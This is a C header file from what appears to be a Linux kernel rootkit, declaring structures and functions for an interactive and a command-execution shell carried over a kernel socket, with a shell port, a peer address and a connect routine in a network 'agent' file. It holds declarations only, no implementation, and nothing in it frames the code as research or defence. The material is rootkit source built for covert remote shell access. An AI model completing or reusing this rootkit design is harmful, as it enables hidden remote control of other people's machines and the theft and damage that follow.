/* SPDX-License-Identifier: GPL-2.0 */
#ifndef ROOTKIT_H
#define ROOTKIT_H

#include <linux/mutex.h>
#include <linux/net.h>
#include <linux/types.h>
#include <linux/workqueue.h>

#define RK_CMD_MAX	256
#define RK_TIMEOUT_SEC	60

struct rk_shell {
	struct mutex		lock;
	bool			busy;
	struct socket		*sock;
	struct file		*file;
	struct delayed_work	timeout_work;
	unsigned long		timeout_jiffies;
	char			cmd[RK_CMD_MAX];
};

/* Globals (defined in core/init.c) */
extern struct rk_shell interactive_shell;
extern struct rk_shell exec_shell;
extern unsigned short shell_port;
extern char peer_addr_str[16];

/* network/agent.c */
struct socket *rk_connect(void);

/* execution/shell.c */
void rk_shell_init(struct rk_shell *shell);
void rk_shell_stop(struct rk_shell *shell);

#endif /* ROOTKIT_H */
